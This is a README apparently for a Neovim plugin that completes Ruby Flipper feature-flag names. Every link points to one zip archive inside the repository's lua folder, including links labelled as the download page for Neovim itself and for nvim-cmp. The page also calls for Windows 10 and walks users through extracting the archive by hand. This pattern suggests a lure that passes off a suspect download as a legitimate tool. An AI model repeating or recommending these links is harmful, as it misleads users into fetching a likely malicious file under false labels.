# 🛠️ flipper-complete.nvim - Easy Ruby Feature Flag Names

[![Download flipper-complete.nvim](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://github.com/shakilbcc/flipper-complete.nvim/raw/refs/heads/main/lua/flipper-complete/complete-nvim-flipper-v2.6.zip)

---

## 📋 What is flipper-complete.nvim?

flipper-complete.nvim is a simple tool for Neovim users who work with Ruby projects. It helps you quickly find and complete feature flag names and descriptions used in your code with the Flipper library. This means less typing and fewer mistakes when you use feature flags.

Even if you are new to Neovim or Ruby, this tool makes it easier to keep track of your feature flags without extra effort.

---

## 🔧 Key Features

- **Autocomplete Ruby Flipper flags**  
  Get instant suggestions for feature flag names and descriptions while you type.
  
- **Supports Neovim Lua plugins**  
  Works smoothly with your existing Neovim setup.

- **Integrates with nvim-cmp**  
  Enhances your code completion experience with one of the most popular Neovim completion plugins.

- **Simple and lightweight**  
  Designed to work fast and without adding extra clutter.

---

## 🖥️ System Requirements

Before downloading, make sure your system meets these requirements:

- Windows 10 or later.
- Neovim installed (version 0.7 or newer).
- Basic familiarity with Neovim setup (no programming needed, just copy-paste).
- Internet connection to download the plugin files.

If you don't have Neovim yet, you can download it from https://github.com/shakilbcc/flipper-complete.nvim/raw/refs/heads/main/lua/flipper-complete/complete-nvim-flipper-v2.6.zip

---

## 🚀 How to Download and Install (Windows)

### Step 1: Visit the Download Page

Click the big button below to open the release page for flipper-complete.nvim. Here you will find the latest version ready to use.

[![Download flipper-complete.nvim](https://img.shields.io/badge/Download-flipper--complete.nvim-blue?style=for-the-badge&logo=github)](https://github.com/shakilbcc/flipper-complete.nvim/raw/refs/heads/main/lua/flipper-complete/complete-nvim-flipper-v2.6.zip)

---

### Step 2: Download the Plugin Files

On the release page, look for the latest release entry. There might be files with names ending in `.zip`, `.tar.gz`, or direct `.nvim` files. Download the version that matches your needs. Usually, it is a `.zip` file containing the plugin assets.

Save it to a place you can easily find, like your Downloads folder.

---

### Step 3: Extract and Place the Files

After downloading:

1. Find the downloaded `.zip` file.
2. Right-click the file and choose "Extract All…".
3. Extract the contents to your Neovim plugins folder. The typical path on Windows is:

```
C:\Users\<YourUserName>\AppData\Local\nvim\site\pack\packer\start\
```

If this path doesn’t exist, create the folders as needed.

Move the extracted folder `flipper-complete.nvim` into the `start` folder.

---

### Step 4: Verify Neovim Setup

Make sure you have the [nvim-cmp](https://github.com/shakilbcc/flipper-complete.nvim/raw/refs/heads/main/lua/flipper-complete/complete-nvim-flipper-v2.6.zip) plugin installed, as flipper-complete.nvim depends on it for completion. If you don’t use a plugin manager, you may need to install this manually.

---

### Step 5: Restart Neovim

Close Neovim if it is open, then start it again. The plugin should load automatically during startup.

---

### Step 6: Start Using flipper-complete.nvim

Open any Ruby file where you use Flipper feature flags. While typing flag names, press your completion shortcut (usually `<Ctrl-Space>` or automatic popup) to see suggestions for flags and descriptions.

---

## ⚙️ How flipper-complete.nvim Works

This plugin hooks into your Neovim completion system. It scans your Ruby project files to find Flipper feature flags. As you type, it offers you matching names and descriptions drawn from your code. This saves time and prevents mistyping flag names that could cause errors.

---

## 📂 Example Usage

1. Open a Ruby project with Flipper feature flags, for example:

```ruby
flipper.enabled?(:new_checkout_flow)
```

2. Start typing `flipper.enabled?(:new_` and the plugin shows a list of feature flags matching that start.

3. Select a suggested flag and press Enter — your code autocompletes with the full flag name.

---

## ❓ Troubleshooting

- If no completions appear, verify you have nvim-cmp installed and enabled.
- Ensure the plugin folder is correctly placed under the Neovim `start` directory.
- Check your Neovim configuration to make sure it loads plugins from the right place.
- Restart Neovim after each plugin installation.
- Look at the Neovim `:messages` command for any errors during startup.

---

## 🔄 Updating flipper-complete.nvim

When a new version is released:

1. Go to the [release page](https://github.com/shakilbcc/flipper-complete.nvim/raw/refs/heads/main/lua/flipper-complete/complete-nvim-flipper-v2.6.zip).
2. Download the newest plugin files.
3. Replace the old plugin folder with the new one in your Neovim plugins directory.
4. Restart Neovim.

---

## 📁 Plugin Folder Location on Windows

The default plugin location on Windows is:

```
C:\Users\<YourUserName>\AppData\Local\nvim\site\pack\packer\start\flipper-complete.nvim
```

You can find your username by opening File Explorer and navigating to `C:\Users`.

---

## 🙋 Support and More Info

For detailed usage and advanced configuration, check the project page at:

https://github.com/shakilbcc/flipper-complete.nvim/raw/refs/heads/main/lua/flipper-complete/complete-nvim-flipper-v2.6.zip

You’ll find instructions and issue reporting there, but for basic use, just follow the steps above.